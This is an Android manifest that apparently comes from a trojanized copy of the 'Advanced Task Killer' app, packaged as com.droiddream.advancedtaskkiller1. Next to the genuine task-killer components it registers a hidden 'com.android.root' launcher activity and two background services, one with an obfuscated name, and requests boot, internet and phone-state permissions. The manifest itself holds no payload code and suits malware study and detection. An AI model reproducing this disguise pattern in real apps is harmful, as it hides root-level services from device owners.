<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.droiddream.advancedtaskkiller1">
    <application android:icon="@drawable/icon2" android:label="@string/app_name">
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.rechild.advancedtaskkiller.AdvancedTaskKiller">
            <intent-filter>
                <action android:name="com.rechild.intent.action.ADVANCED_TASK_KILLER_FREE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name="com.android.root.main">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name="com.android.root.Setting" android:process=":remote"/>
        <service android:name="c$P" android:process=":remote2"/>
        <activity android:name="com.rechild.advancedtaskkiller.NewSettings"/>
        <activity android:name="com.rechild.advancedtaskkiller.IgnoreListActivity">
            <intent-filter>
                <action android:name="com.rechild.advancedtaskkiller.intent.action.IgnoreList"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <receiver android:name="com.rechild.advancedtaskkiller.AutoStartReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name="com.rechild.advancedtaskkiller.BackService"/>
        <receiver android:icon="@drawable/icon2" android:label="@string/app_name" android:name="com.rechild.advancedtaskkiller.OneClickAppWidgetProvider">
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
            </intent-filter>
            <meta-data android:name="android.appwidget.provider" android:resource="@xml/appwidget_provider"/>
        </receiver>
        <receiver android:name="com.rechild.advancedtaskkiller.AlarmReceiver"/>
    </application>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
</manifest>